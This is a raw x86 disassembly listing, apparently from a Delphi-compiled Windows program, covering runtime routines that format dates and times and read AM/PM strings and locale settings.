  405c64:	c6 45 e3 00          	movb   $0x0,-0x1d(%ebp)
  405c68:	e9 e4 04 00 00       	jmp    0x406151
  405c6d:	88 45 fb             	mov    %al,-0x5(%ebp)
  405c70:	ff 45 fc             	incl   -0x4(%ebp)
  405c73:	8a 45 fb             	mov    -0x5(%ebp),%al
  405c76:	8b d0                	mov    %eax,%edx
  405c78:	80 c2 9f             	add    $0x9f,%dl
  405c7b:	80 ea 1a             	sub    $0x1a,%dl
  405c7e:	73 02                	jae    0x405c82
  405c80:	2c 20                	sub    $0x20,%al
  405c82:	8b d0                	mov    %eax,%edx
  405c84:	80 c2 bf             	add    $0xbf,%dl
  405c87:	80 ea 1a             	sub    $0x1a,%dl
  405c8a:	73 0d                	jae    0x405c99
  405c8c:	3c 4d                	cmp    $0x4d,%al
  405c8e:	75 07                	jne    0x405c97
  405c90:	80 fb 48             	cmp    $0x48,%bl
  405c93:	75 02                	jne    0x405c97
  405c95:	b0 4e                	mov    $0x4e,%al
  405c97:	8b d8                	mov    %eax,%ebx
  405c99:	25 ff 00 00 00       	and    $0xff,%eax
  405c9e:	83 c0 de             	add    $0xffffffde,%eax
  405ca1:	83 f8 37             	cmp    $0x37,%eax
  405ca4:	0f 87 95 04 00 00    	ja     0x40613f
  405caa:	8a 80 b7 5c 40 00    	mov    0x405cb7(%eax),%al
  405cb0:	ff 24 85 ef 5c 40 00 	jmp    *0x405cef(,%eax,4)
  405cb7:	0c 00                	or     $0x0,%al
  405cb9:	00 00                	add    %al,(%eax)
  405cbb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405cbe:	00 00                	add    %al,(%eax)
  405cc0:	00 00                	add    %al,(%eax)
  405cc2:	00 00                	add    %al,(%eax)
  405cc4:	0a 00                	or     (%eax),%al
	...
  405cce:	00 0b                	add    %cl,(%ebx)
  405cd0:	00 00                	add    %al,(%eax)
  405cd2:	00 00                	add    %al,(%eax)
  405cd4:	00 00                	add    %al,(%eax)
  405cd6:	08 00                	or     %al,(%eax)
  405cd8:	09 03                	or     %eax,(%ebx)
  405cda:	00 00                	add    %al,(%eax)
  405cdc:	00 04 00             	add    %al,(%eax,%eax,1)
  405cdf:	00 00                	add    %al,(%eax)
  405ce1:	00 02                	add    %al,(%edx)
  405ce3:	05 00 00 00 00       	add    $0x0,%eax
  405ce8:	06                   	push   %es
  405ce9:	07                   	pop    %es
  405cea:	00 00                	add    %al,(%eax)
  405cec:	00 00                	add    %al,(%eax)
  405cee:	01 3f                	add    %edi,(%edi)
  405cf0:	61                   	popa
  405cf1:	40                   	inc    %eax
  405cf2:	00 23                	add    %ah,(%ebx)
  405cf4:	5d                   	pop    %ebp
  405cf5:	40                   	inc    %eax
  405cf6:	00 71 5d             	add    %dh,0x5d(%ecx)
  405cf9:	40                   	inc    %eax
  405cfa:	00 d6                	add    %dl,%dh
  405cfc:	5d                   	pop    %ebp
  405cfd:	40                   	inc    %eax
  405cfe:	00 7d 5e             	add    %bh,0x5e(%ebp)
  405d01:	40                   	inc    %eax
  405d02:	00 14 5f             	add    %dl,(%edi,%ebx,2)
  405d05:	40                   	inc    %eax
  405d06:	00 45 5f             	add    %al,0x5f(%ebp)
  405d09:	40                   	inc    %eax
  405d0a:	00 76 5f             	add    %dh,0x5f(%esi)
  405d0d:	40                   	inc    %eax
  405d0e:	00 ab 5f 40 00 84    	add    %ch,-0x7bffbfa1(%ebx)
  405d14:	60                   	pusha
  405d15:	40                   	inc    %eax
  405d16:	00 df                	add    %bl,%bh
  405d18:	60                   	pusha
  405d19:	40                   	inc    %eax
  405d1a:	00 f5                	add    %dh,%ch
  405d1c:	60                   	pusha
  405d1d:	40                   	inc    %eax
  405d1e:	00 0b                	add    %cl,(%ebx)
  405d20:	61                   	popa
  405d21:	40                   	inc    %eax
  405d22:	00 55 e8             	add    %dl,-0x18(%ebp)
  405d25:	63 fe                	arpl   %edi,%esi
  405d27:	ff                   	(bad)
  405d28:	ff 59 55             	lcall  *0x55(%ecx)
  405d2b:	e8 88 fe ff ff       	call   0x405bb8
  405d30:	59                   	pop    %ecx
  405d31:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  405d35:	7f 22                	jg     0x405d59
  405d37:	8b 45 08             	mov    0x8(%ebp),%eax
  405d3a:	50                   	push   %eax
  405d3b:	0f b7 45 f2          	movzwl -0xe(%ebp),%eax
  405d3f:	b9 64 00 00 00       	mov    $0x64,%ecx
  405d44:	99                   	cltd
  405d45:	f7 f9                	idiv   %ecx
  405d47:	8b c2                	mov    %edx,%eax
  405d49:	ba 02 00 00 00       	mov    $0x2,%edx
  405d4e:	e8 ed fd ff ff       	call   0x405b40
  405d53:	59                   	pop    %ecx
  405d54:	e9 f8 03 00 00       	jmp    0x406151
  405d59:	8b 45 08             	mov    0x8(%ebp),%eax
  405d5c:	50                   	push   %eax
  405d5d:	0f b7 45 f2          	movzwl -0xe(%ebp),%eax
  405d61:	ba 04 00 00 00       	mov    $0x4,%edx
  405d66:	e8 d5 fd ff ff       	call   0x405b40
  405d6b:	59                   	pop    %ecx
  405d6c:	e9 e0 03 00 00       	jmp    0x406151
  405d71:	55                   	push   %ebp
  405d72:	e8 15 fe ff ff       	call   0x405b8c
  405d77:	59                   	pop    %ecx
  405d78:	55                   	push   %ebp
  405d79:	e8 3a fe ff ff       	call   0x405bb8
  405d7e:	59                   	pop    %ecx
  405d7f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405d82:	48                   	dec    %eax
  405d83:	83 e8 02             	sub    $0x2,%eax
  405d86:	72 04                	jb     0x405d8c
  405d88:	74 18                	je     0x405da2
  405d8a:	eb 30                	jmp    0x405dbc
  405d8c:	8b 45 08             	mov    0x8(%ebp),%eax
  405d8f:	50                   	push   %eax
  405d90:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  405d94:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405d97:	e8 a4 fd ff ff       	call   0x405b40
  405d9c:	59                   	pop    %ecx
  405d9d:	e9 af 03 00 00       	jmp    0x406151
  405da2:	8b 45 08             	mov    0x8(%ebp),%eax
  405da5:	50                   	push   %eax
  405da6:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  405daa:	8b 04 85 b4 c4 40 00 	mov    0x40c4b4(,%eax,4),%eax
  405db1:	e8 6a fd ff ff       	call   0x405b20
  405db6:	59                   	pop    %ecx
  405db7:	e9 95 03 00 00       	jmp    0x406151
  405dbc:	8b 45 08             	mov    0x8(%ebp),%eax
  405dbf:	50                   	push   %eax
  405dc0:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  405dc4:	8b 04 85 e4 c4 40 00 	mov    0x40c4e4(,%eax,4),%eax
  405dcb:	e8 50 fd ff ff       	call   0x405b20
  405dd0:	59                   	pop    %ecx
  405dd1:	e9 7b 03 00 00       	jmp    0x406151
  405dd6:	55                   	push   %ebp
  405dd7:	e8 b0 fd ff ff       	call   0x405b8c
  405ddc:	59                   	pop    %ecx
  405ddd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405de0:	48                   	dec    %eax
  405de1:	83 e8 02             	sub    $0x2,%eax
  405de4:	72 0a                	jb     0x405df0
  405de6:	74 25                	je     0x405e0d
  405de8:	48                   	dec    %eax
  405de9:	74 46                	je     0x405e31
  405deb:	48                   	dec    %eax
  405dec:	74 67                	je     0x405e55
  405dee:	eb 79                	jmp    0x405e69
  405df0:	55                   	push   %ebp
  405df1:	e8 c2 fd ff ff       	call   0x405bb8
  405df6:	59                   	pop    %ecx
  405df7:	8b 45 08             	mov    0x8(%ebp),%eax
  405dfa:	50                   	push   %eax
  405dfb:	0f b7 45 ee          	movzwl -0x12(%ebp),%eax
  405dff:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405e02:	e8 39 fd ff ff       	call   0x405b40
  405e07:	59                   	pop    %ecx
  405e08:	e9 44 03 00 00       	jmp    0x406151
  405e0d:	8b 45 08             	mov    0x8(%ebp),%eax
  405e10:	50                   	push   %eax
  405e11:	8b 45 08             	mov    0x8(%ebp),%eax
  405e14:	ff 70 0c             	push   0xc(%eax)
  405e17:	ff 70 08             	push   0x8(%eax)
  405e1a:	e8 11 fc ff ff       	call   0x405a30
  405e1f:	8b 04 85 14 c5 40 00 	mov    0x40c514(,%eax,4),%eax
  405e26:	e8 f5 fc ff ff       	call   0x405b20
  405e2b:	59                   	pop    %ecx
  405e2c:	e9 20 03 00 00       	jmp    0x406151
  405e31:	8b 45 08             	mov    0x8(%ebp),%eax
  405e34:	50                   	push   %eax
  405e35:	8b 45 08             	mov    0x8(%ebp),%eax
  405e38:	ff 70 0c             	push   0xc(%eax)
  405e3b:	ff 70 08             	push   0x8(%eax)
  405e3e:	e8 ed fb ff ff       	call   0x405a30
  405e43:	8b 04 85 30 c5 40 00 	mov    0x40c530(,%eax,4),%eax
  405e4a:	e8 d1 fc ff ff       	call   0x405b20
  405e4f:	59                   	pop    %ecx
  405e50:	e9 fc 02 00 00       	jmp    0x406151
  405e55:	8b 45 08             	mov    0x8(%ebp),%eax
  405e58:	50                   	push   %eax
  405e59:	a1 9c c4 40 00       	mov    0x40c49c,%eax
  405e5e:	e8 cd fd ff ff       	call   0x405c30
  405e63:	59                   	pop    %ecx
  405e64:	e9 e8 02 00 00       	jmp    0x406151
  405e69:	8b 45 08             	mov    0x8(%ebp),%eax
  405e6c:	50                   	push   %eax
  405e6d:	a1 a0 c4 40 00       	mov    0x40c4a0,%eax
  405e72:	e8 b9 fd ff ff       	call   0x405c30
  405e77:	59                   	pop    %ecx
  405e78:	e9 d4 02 00 00       	jmp    0x406151
  405e7d:	55                   	push   %ebp
  405e7e:	e8 09 fd ff ff       	call   0x405b8c
  405e83:	59                   	pop    %ecx
  405e84:	55                   	push   %ebp
  405e85:	e8 66 fd ff ff       	call   0x405bf0
  405e8a:	59                   	pop    %ecx
  405e8b:	c6 45 e2 00          	movb   $0x0,-0x1e(%ebp)
  405e8f:	33 d2                	xor    %edx,%edx
  405e91:	8b 75 fc             	mov    -0x4(%ebp),%esi
  405e94:	eb 37                	jmp    0x405ecd
  405e96:	25 ff 00 00 00       	and    $0xff,%eax
  405e9b:	83 f8 48             	cmp    $0x48,%eax
  405e9e:	7f 13                	jg     0x405eb3
  405ea0:	74 31                	je     0x405ed3
  405ea2:	83 e8 22             	sub    $0x22,%eax
  405ea5:	74 22                	je     0x405ec9
  405ea7:	83 e8 05             	sub    $0x5,%eax
  405eaa:	74 1d                	je     0x405ec9
  405eac:	83 e8 1a             	sub    $0x1a,%eax
  405eaf:	74 0e                	je     0x405ebf
  405eb1:	eb 19                	jmp    0x405ecc
  405eb3:	83 e8 61             	sub    $0x61,%eax
  405eb6:	74 07                	je     0x405ebf
  405eb8:	83 e8 07             	sub    $0x7,%eax
  405ebb:	74 16                	je     0x405ed3
  405ebd:	eb 0d                	jmp    0x405ecc
  405ebf:	84 d2                	test   %dl,%dl
  405ec1:	75 09                	jne    0x405ecc
  405ec3:	c6 45 e2 01          	movb   $0x1,-0x1e(%ebp)
  405ec7:	eb 0a                	jmp    0x405ed3
  405ec9:	80 f2 01             	xor    $0x1,%dl
  405ecc:	46                   	inc    %esi
  405ecd:	8a 06                	mov    (%esi),%al
  405ecf:	84 c0                	test   %al,%al
  405ed1:	75 c3                	jne    0x405e96
  405ed3:	66 8b 45 ea          	mov    -0x16(%ebp),%ax
  405ed7:	80 7d e2 00          	cmpb   $0x0,-0x1e(%ebp)
  405edb:	74 15                	je     0x405ef2
  405edd:	66 85 c0             	test   %ax,%ax
  405ee0:	75 06                	jne    0x405ee8
  405ee2:	66 b8 0c 00          	mov    $0xc,%ax
  405ee6:	eb 0a                	jmp    0x405ef2
  405ee8:	66 83 f8 0c          	cmp    $0xc,%ax
  405eec:	76 04                	jbe    0x405ef2
  405eee:	66 83 e8 0c          	sub    $0xc,%ax
  405ef2:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  405ef6:	7e 07                	jle    0x405eff
  405ef8:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  405eff:	8b 55 08             	mov    0x8(%ebp),%edx
  405f02:	52                   	push   %edx
  405f03:	0f b7 c0             	movzwl %ax,%eax
  405f06:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405f09:	e8 32 fc ff ff       	call   0x405b40
  405f0e:	59                   	pop    %ecx
  405f0f:	e9 3d 02 00 00       	jmp    0x406151
  405f14:	55                   	push   %ebp
  405f15:	e8 72 fc ff ff       	call   0x405b8c
  405f1a:	59                   	pop    %ecx
  405f1b:	55                   	push   %ebp
  405f1c:	e8 cf fc ff ff       	call   0x405bf0
  405f21:	59                   	pop    %ecx
  405f22:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  405f26:	7e 07                	jle    0x405f2f
  405f28:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  405f2f:	8b 45 08             	mov    0x8(%ebp),%eax
  405f32:	50                   	push   %eax
  405f33:	0f b7 45 e8          	movzwl -0x18(%ebp),%eax
  405f37:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405f3a:	e8 01 fc ff ff       	call   0x405b40
  405f3f:	59                   	pop    %ecx
  405f40:	e9 0c 02 00 00       	jmp    0x406151
  405f45:	55                   	push   %ebp
  405f46:	e8 41 fc ff ff       	call   0x405b8c
  405f4b:	59                   	pop    %ecx
  405f4c:	55                   	push   %ebp
  405f4d:	e8 9e fc ff ff       	call   0x405bf0
  405f52:	59                   	pop    %ecx
  405f53:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  405f57:	7e 07                	jle    0x405f60
  405f59:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  405f60:	8b 45 08             	mov    0x8(%ebp),%eax
  405f63:	50                   	push   %eax
  405f64:	0f b7 45 e6          	movzwl -0x1a(%ebp),%eax
  405f68:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405f6b:	e8 d0 fb ff ff       	call   0x405b40
  405f70:	59                   	pop    %ecx
  405f71:	e9 db 01 00 00       	jmp    0x406151
  405f76:	55                   	push   %ebp
  405f77:	e8 10 fc ff ff       	call   0x405b8c
  405f7c:	59                   	pop    %ecx
  405f7d:	83 7d f4 01          	cmpl   $0x1,-0xc(%ebp)
  405f81:	75 14                	jne    0x405f97
  405f83:	8b 45 08             	mov    0x8(%ebp),%eax
  405f86:	50                   	push   %eax
  405f87:	a1 b0 c4 40 00       	mov    0x40c4b0,%eax
  405f8c:	e8 9f fc ff ff       	call   0x405c30
  405f91:	59                   	pop    %ecx
  405f92:	e9 ba 01 00 00       	jmp    0x406151
  405f97:	8b 45 08             	mov    0x8(%ebp),%eax
  405f9a:	50                   	push   %eax
  405f9b:	a1 b4 c4 40 00       	mov    0x40c4b4,%eax
  405fa0:	e8 8b fc ff ff       	call   0x405c30
  405fa5:	59                   	pop    %ecx
  405fa6:	e9 a6 01 00 00       	jmp    0x406151
  405fab:	55                   	push   %ebp
  405fac:	e8 3f fc ff ff       	call   0x405bf0
  405fb1:	59                   	pop    %ecx
  405fb2:	8b 75 fc             	mov    -0x4(%ebp),%esi
  405fb5:	4e                   	dec    %esi
  405fb6:	ba 70 61 40 00       	mov    $0x406170,%edx
  405fbb:	b9 05 00 00 00       	mov    $0x5,%ecx
  405fc0:	8b c6                	mov    %esi,%eax
  405fc2:	e8 ed f1 ff ff       	call   0x4051b4
  405fc7:	85 c0                	test   %eax,%eax
  405fc9:	75 24                	jne    0x405fef
  405fcb:	66 83 7d ea 0c       	cmpw   $0xc,-0x16(%ebp)
  405fd0:	72 03                	jb     0x405fd5
  405fd2:	83 c6 03             	add    $0x3,%esi
  405fd5:	8b 45 08             	mov    0x8(%ebp),%eax
  405fd8:	50                   	push   %eax
  405fd9:	ba 02 00 00 00       	mov    $0x2,%edx
  405fde:	8b c6                	mov    %esi,%eax
  405fe0:	e8 f7 fa ff ff       	call   0x405adc
  405fe5:	59                   	pop    %ecx
  405fe6:	83 45 fc 04          	addl   $0x4,-0x4(%ebp)
  405fea:	e9 62 01 00 00       	jmp    0x406151
  405fef:	ba 78 61 40 00       	mov    $0x406178,%edx
  405ff4:	b9 03 00 00 00       	mov    $0x3,%ecx
  405ff9:	8b c6                	mov    %esi,%eax
  405ffb:	e8 b4 f1 ff ff       	call   0x4051b4
  406000:	85 c0                	test   %eax,%eax
  406002:	75 24                	jne    0x406028
  406004:	66 83 7d ea 0c       	cmpw   $0xc,-0x16(%ebp)
  406009:	72 03                	jb     0x40600e
  40600b:	83 c6 02             	add    $0x2,%esi
  40600e:	8b 45 08             	mov    0x8(%ebp),%eax
  406011:	50                   	push   %eax
  406012:	ba 01 00 00 00       	mov    $0x1,%edx
  406017:	8b c6                	mov    %esi,%eax
  406019:	e8 be fa ff ff       	call   0x405adc
  40601e:	59                   	pop    %ecx
  40601f:	83 45 fc 02          	addl   $0x2,-0x4(%ebp)
  406023:	e9 29 01 00 00       	jmp    0x406151
  406028:	ba 7c 61 40 00       	mov    $0x40617c,%edx
  40602d:	b9 04 00 00 00       	mov    $0x4,%ecx
  406032:	8b c6                	mov    %esi,%eax
  406034:	e8 7b f1 ff ff       	call   0x4051b4
  406039:	85 c0                	test   %eax,%eax
  40603b:	75 30                	jne    0x40606d
  40603d:	66 83 7d ea 0c       	cmpw   $0xc,-0x16(%ebp)
  406042:	73 11                	jae    0x406055
  406044:	8b 45 08             	mov    0x8(%ebp),%eax
  406047:	50                   	push   %eax
  406048:	a1 a8 c4 40 00       	mov    0x40c4a8,%eax
  40604d:	e8 ce fa ff ff       	call   0x405b20
  406052:	59                   	pop    %ecx
  406053:	eb 0f                	jmp    0x406064
  406055:	8b 45 08             	mov    0x8(%ebp),%eax
  406058:	50                   	push   %eax
  406059:	a1 ac c4 40 00       	mov    0x40c4ac,%eax
  40605e:	e8 bd fa ff ff       	call   0x405b20
  406063:	59                   	pop    %ecx
  406064:	83 45 fc 03          	addl   $0x3,-0x4(%ebp)
  406068:	e9 e4 00 00 00       	jmp    0x406151
  40606d:	8b 45 08             	mov    0x8(%ebp),%eax
  406070:	50                   	push   %eax
  406071:	8d 45 fb             	lea    -0x5(%ebp),%eax
  406074:	ba 01 00 00 00       	mov    $0x1,%edx
  406079:	e8 5e fa ff ff       	call   0x405adc
  40607e:	59                   	pop    %ecx
  40607f:	e9 cd 00 00 00       	jmp    0x406151
  406084:	55                   	push   %ebp
  406085:	e8 02 fb ff ff       	call   0x405b8c
  40608a:	59                   	pop    %ecx
  40608b:	8b 45 08             	mov    0x8(%ebp),%eax
  40608e:	50                   	push   %eax
  40608f:	a1 9c c4 40 00       	mov    0x40c49c,%eax
  406094:	e8 97 fb ff ff       	call   0x405c30
  406099:	59                   	pop    %ecx
  40609a:	55                   	push   %ebp
  40609b:	e8 50 fb ff ff       	call   0x405bf0
  4060a0:	59                   	pop    %ecx
  4060a1:	66 83 7d ea 00       	cmpw   $0x0,-0x16(%ebp)
  4060a6:	75 12                	jne    0x4060ba
  4060a8:	66 83 7d e8 00       	cmpw   $0x0,-0x18(%ebp)
  4060ad:	75 0b                	jne    0x4060ba
  4060af:	66 83 7d e6 00       	cmpw   $0x0,-0x1a(%ebp)
  4060b4:	0f 84 97 00 00 00    	je     0x406151
  4060ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4060bd:	50                   	push   %eax
  4060be:	b8 84 61 40 00       	mov    $0x406184,%eax
  4060c3:	ba 01 00 00 00       	mov    $0x1,%edx
  4060c8:	e8 0f fa ff ff       	call   0x405adc
  4060cd:	59                   	pop    %ecx
  4060ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4060d1:	50                   	push   %eax
  4060d2:	a1 b4 c4 40 00       	mov    0x40c4b4,%eax
  4060d7:	e8 54 fb ff ff       	call   0x405c30
  4060dc:	59                   	pop    %ecx
  4060dd:	eb 72                	jmp    0x406151
  4060df:	8b 45 08             	mov    0x8(%ebp),%eax
  4060e2:	50                   	push   %eax
  4060e3:	b8 99 c4 40 00       	mov    $0x40c499,%eax
  4060e8:	ba 01 00 00 00       	mov    $0x1,%edx
  4060ed:	e8 ea f9 ff ff       	call   0x405adc
  4060f2:	59                   	pop    %ecx
  4060f3:	eb 5c                	jmp    0x406151
  4060f5:	8b 45 08             	mov    0x8(%ebp),%eax
  4060f8:	50                   	push   %eax
  4060f9:	b8 a4 c4 40 00       	mov    $0x40c4a4,%eax
  4060fe:	ba 01 00 00 00       	mov    $0x1,%edx
  406103:	e8 d4 f9 ff ff       	call   0x405adc
  406108:	59                   	pop    %ecx
  406109:	eb 46                	jmp    0x406151
  40610b:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40610e:	eb 03                	jmp    0x406113
  406110:	ff 45 fc             	incl   -0x4(%ebp)
  406113:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406116:	8a 00                	mov    (%eax),%al
  406118:	84 c0                	test   %al,%al
  40611a:	74 05                	je     0x406121
  40611c:	3a 45 fb             	cmp    -0x5(%ebp),%al
  40611f:	75 ef                	jne    0x406110
  406121:	8b 45 08             	mov    0x8(%ebp),%eax
  406124:	50                   	push   %eax
  406125:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406128:	2b d6                	sub    %esi,%edx
  40612a:	8b c6                	mov    %esi,%eax
  40612c:	e8 ab f9 ff ff       	call   0x405adc
  406131:	59                   	pop    %ecx
  406132:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406135:	80 38 00             	cmpb   $0x0,(%eax)
  406138:	74 17                	je     0x406151
  40613a:	ff 45 fc             	incl   -0x4(%ebp)
  40613d:	eb 12                	jmp    0x406151
  40613f:	8b 45 08             	mov    0x8(%ebp),%eax
  406142:	50                   	push   %eax
  406143:	8d 45 fb             	lea    -0x5(%ebp),%eax
  406146:	ba 01 00 00 00       	mov    $0x1,%edx
  40614b:	e8 8c f9 ff ff       	call   0x405adc
  406150:	59                   	pop    %ecx
  406151:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406154:	8a 00                	mov    (%eax),%al
  406156:	84 c0                	test   %al,%al
  406158:	0f 85 0f fb ff ff    	jne    0x405c6d
  40615e:	8b 45 08             	mov    0x8(%ebp),%eax
  406161:	ff 88 f8 fe ff ff    	decl   -0x108(%eax)
  406167:	5e                   	pop    %esi
  406168:	5b                   	pop    %ebx
  406169:	8b e5                	mov    %ebp,%esp
  40616b:	5d                   	pop    %ebp
  40616c:	c3                   	ret
  40616d:	00 00                	add    %al,(%eax)
  40616f:	00 41 4d             	add    %al,0x4d(%ecx)
  406172:	2f                   	das
  406173:	50                   	push   %eax
  406174:	4d                   	dec    %ebp
  406175:	00 00                	add    %al,(%eax)
  406177:	00 41 2f             	add    %al,0x2f(%ecx)
  40617a:	50                   	push   %eax
  40617b:	00 41 4d             	add    %al,0x4d(%ecx)
  40617e:	50                   	push   %eax
  40617f:	4d                   	dec    %ebp
  406180:	00 00                	add    %al,(%eax)
  406182:	00 00                	add    %al,(%eax)
  406184:	20 00                	and    %al,(%eax)
  406186:	00 00                	add    %al,(%eax)
  406188:	55                   	push   %ebp
  406189:	8b ec                	mov    %esp,%ebp
  40618b:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  406191:	53                   	push   %ebx
  406192:	56                   	push   %esi
  406193:	8b da                	mov    %edx,%ebx
  406195:	8b f0                	mov    %eax,%esi
  406197:	33 c0                	xor    %eax,%eax
  406199:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
  40619f:	33 c0                	xor    %eax,%eax
  4061a1:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  4061a7:	85 db                	test   %ebx,%ebx
  4061a9:	74 0b                	je     0x4061b6
  4061ab:	55                   	push   %ebp
  4061ac:	8b c3                	mov    %ebx,%eax
  4061ae:	e8 7d fa ff ff       	call   0x405c30
  4061b3:	59                   	pop    %ecx
  4061b4:	eb 0c                	jmp    0x4061c2
  4061b6:	55                   	push   %ebp
  4061b7:	b8 e0 61 40 00       	mov    $0x4061e0,%eax
  4061bc:	e8 6f fa ff ff       	call   0x405c30
  4061c1:	59                   	pop    %ecx
  4061c2:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  4061c8:	8b c6                	mov    %esi,%eax
  4061ca:	8b 8d fc fe ff ff    	mov    -0x104(%ebp),%ecx
  4061d0:	e8 eb cf ff ff       	call   0x4031c0
  4061d5:	5e                   	pop    %esi
  4061d6:	5b                   	pop    %ebx
  4061d7:	8b e5                	mov    %ebp,%esp
  4061d9:	5d                   	pop    %ebp
  4061da:	c2 08 00             	ret    $0x8
  4061dd:	00 00                	add    %al,(%eax)
  4061df:	00 43 00             	add    %al,0x0(%ebx)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	55                   	push   %ebp
  4061e5:	8b ec                	mov    %esp,%ebp
  4061e7:	ff 75 0c             	push   0xc(%ebp)
  4061ea:	ff 75 08             	push   0x8(%ebp)
  4061ed:	8b 15 9c c4 40 00    	mov    0x40c49c,%edx
  4061f3:	e8 90 ff ff ff       	call   0x406188
  4061f8:	5d                   	pop    %ebp
  4061f9:	c2 08 00             	ret    $0x8
  4061fc:	55                   	push   %ebp
  4061fd:	8b ec                	mov    %esp,%ebp
  4061ff:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  406205:	53                   	push   %ebx
  406206:	56                   	push   %esi
  406207:	8b f1                	mov    %ecx,%esi
  406209:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40620c:	68 00 01 00 00       	push   $0x100
  406211:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  406217:	51                   	push   %ecx
  406218:	52                   	push   %edx
  406219:	50                   	push   %eax
  40621a:	e8 2d e4 ff ff       	call   0x40464c
  40621f:	85 c0                	test   %eax,%eax
  406221:	7e 12                	jle    0x406235
  406223:	8b c8                	mov    %eax,%ecx
  406225:	49                   	dec    %ecx
  406226:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  40622c:	8b c3                	mov    %ebx,%eax
  40622e:	e8 8d cf ff ff       	call   0x4031c0
  406233:	eb 09                	jmp    0x40623e
  406235:	8b c3                	mov    %ebx,%eax
  406237:	8b d6                	mov    %esi,%edx
  406239:	e8 36 cf ff ff       	call   0x403174
  40623e:	5e                   	pop    %esi
  40623f:	5b                   	pop    %ebx
  406240:	8b e5                	mov    %ebp,%esp
  406242:	5d                   	pop    %ebp
  406243:	c2 04 00             	ret    $0x4
  406246:	8b c0                	mov    %eax,%eax
  406248:	53                   	push   %ebx
  406249:	56                   	push   %esi
  40624a:	57                   	push   %edi
  40624b:	51                   	push   %ecx
  40624c:	8b d9                	mov    %ecx,%ebx
  40624e:	8b f2                	mov    %edx,%esi
  406250:	8b f8                	mov    %eax,%edi
  406252:	6a 02                	push   $0x2
  406254:	8d 44 24 04          	lea    0x4(%esp),%eax
  406258:	50                   	push   %eax
  406259:	56                   	push   %esi
  40625a:	57                   	push   %edi
  40625b:	e8 ec e3 ff ff       	call   0x40464c
  406260:	85 c0                	test   %eax,%eax
  406262:	7e 05                	jle    0x406269
  406264:	8a 04 24             	mov    (%esp),%al
  406267:	eb 02                	jmp    0x40626b
  406269:	8b c3                	mov    %ebx,%eax
  40626b:	5a                   	pop    %edx
  40626c:	5f                   	pop    %edi
  40626d:	5e                   	pop    %esi
  40626e:	5b                   	pop    %ebx
  40626f:	c3                   	ret
  406270:	55                   	push   %ebp
  406271:	8b ec                	mov    %esp,%ebp
  406273:	83 c4 f0             	add    $0xfffffff0,%esp
  406276:	53                   	push   %ebx
  406277:	56                   	push   %esi
  406278:	57                   	push   %edi
  406279:	33 c0                	xor    %eax,%eax
  40627b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40627e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406281:	33 c0                	xor    %eax,%eax
  406283:	55                   	push   %ebp
  406284:	68 a6 63 40 00       	push   $0x4063a6
  406289:	64 ff 30             	push   %fs:(%eax)
  40628c:	64 89 20             	mov    %esp,%fs:(%eax)
  40628f:	e8 c8 e3 ff ff       	call   0x40465c
  406294:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406297:	bb 01 00 00 00       	mov    $0x1,%ebx
  40629c:	be b8 c4 40 00       	mov    $0x40c4b8,%esi
  4062a1:	bf e8 c4 40 00       	mov    $0x40c4e8,%edi
  4062a6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4062a9:	50                   	push   %eax
  4062aa:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4062ad:	8d 83 bf ff 00 00    	lea    0xffbf(%ebx),%eax
  4062b3:	e8 90 ea ff ff       	call   0x404d48
  4062b8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4062bb:	8d 53 44             	lea    0x44(%ebx),%edx
  4062be:	4a                   	dec    %edx
  4062bf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4062c2:	e8 35 ff ff ff       	call   0x4061fc
  4062c7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4062ca:	8b c6                	mov    %esi,%eax
  4062cc:	e8 5f ce ff ff       	call   0x403130
  4062d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4062d4:	50                   	push   %eax
  4062d5:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4062d8:	8d 83 cf ff 00 00    	lea    0xffcf(%ebx),%eax
  4062de:	e8 65 ea ff ff       	call   0x404d48
  4062e3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4062e6:	8d 53 38             	lea    0x38(%ebx),%edx
  4062e9:	4a                   	dec    %edx
  4062ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4062ed:	e8 0a ff ff ff       	call   0x4061fc
  4062f2:	8b 55 f4             	mov    -0xc(%ebp),%edx
